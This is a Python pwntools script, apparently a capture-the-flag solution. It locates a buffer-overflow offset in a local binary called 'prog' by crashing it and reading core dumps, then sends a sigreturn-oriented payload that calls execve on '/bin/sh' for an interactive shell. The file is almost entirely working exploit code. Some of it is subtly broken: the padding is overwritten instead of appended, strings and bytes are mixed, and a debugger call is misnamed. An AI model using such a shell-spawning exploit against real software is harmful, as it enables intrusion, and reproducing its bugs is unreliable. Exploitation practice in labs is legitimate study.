from pwn import *

context(terminal=["tmux","wsplit","-h"])
context.arch = "amd64"
context.delete_corefiles = True

syscall = 0x1142
binsh = 0x304d

def send_payload(srop_frame,offset):

    global elf
    rop = ROP(elf)
    pop_rax = rop.find_gadget(['pop rax','ret'])[0]

    payload = "A" * offset
    payload = p64(pop_rax)
    payload = p64(0xf)
    payload += srop_frame

    p = process(elf.path)
    log.info("Sending exploit")
    p.gdb_attach(p)
    p.sendline(payload)
    p.interactive()

def locate_offset():

    global elf
    context.log_level = "ERROR"
    offset = 0 
    buff_sz = 1

    l = log.progress("Locating offset...",level=40)

    while offset <= 0:

        p = process(elf.path)
        payload = cyclic(buff_sz)

        l.status("trying %d bytes" % buff_sz)
        p.sendline(payload)
        p.wait()

        try:
            core = p.corefile
            rsp = core.rsp
            offset = core.read(rsp,4)
            offset = cyclic_find(offset)
        except:
            pass

        p.close()
        buff_sz += 1

    l.success("offset at %d bytes" % offset)
    context.log_level = "INFO"
    return offset


if __name__ == '__main__':

    global elf
    elf = ELF('prog')

    offset = locate_offset()

    frame = SigreturnFrame(kernel='amd64')
    frame.rax = constants.SYS_execve
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = 0xdeadbeef
    frame.rip = syscall

    send_payload(str(frame),offset)
    
